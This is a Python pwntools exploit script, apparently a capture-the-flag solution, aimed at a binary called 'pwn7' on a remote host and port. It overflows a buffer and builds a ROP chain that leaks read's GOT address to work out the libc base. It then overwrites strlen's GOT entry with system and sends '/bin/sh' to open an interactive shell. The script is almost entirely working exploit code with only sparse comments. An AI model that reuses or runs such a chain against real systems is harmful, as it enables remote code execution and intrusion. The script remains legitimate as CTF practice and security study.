from pwn import *

file=ELF('./pwn7')



#p=process('./pwn7')

p=remote('114.116.54.89',"10007")

context.log_level='debug'

write_got=file.got['write']
strlen_got=file.got['strlen']
read_got=file.got['read']

write_plt=file.plt['write']
strlen_plt=file.plt['strlen']
read_plt=file.plt['read']

padding='a'*40

payload=padding

payload+=p32(write_plt)

clear_stack=0x08048559

payload+=p32(clear_stack)

payload+=p32(1)+p32(read_got)+p32(4)

# ahead is leak addr of write , so get the libc_basic
# now is ret to input the shell addr to get shell


payload+=p32(read_plt)
payload+=p32(clear_stack)
payload+=p32(1)+p32(strlen_got)+p32(4+8)# yes wo have chenged the read addr



# or we can change some write_got to the addr we want(shell) use read

payload+=p32(strlen_plt)
payload+=p32(clear_stack)
payload+=p32(strlen_got+4)+p32(0)+p32(0)
payload = payload.ljust(0x80,"\x00")

p.recvuntil('name:\n')

p.send(payload)

read_libc=u32(p.recv(4))

success(hex(read_libc))

libc_basic=read_libc-0x0d4350

libc_shell=libc_basic+0x000993D7

#getshell='a'*40+p32(libc_shell)

system_libc=libc_basic+0x03a940
str_libc=libc_basic+0x13234e
getshell=p32(system_libc)+"/bin/sh\x00"
p.send(getshell)

p.interactive()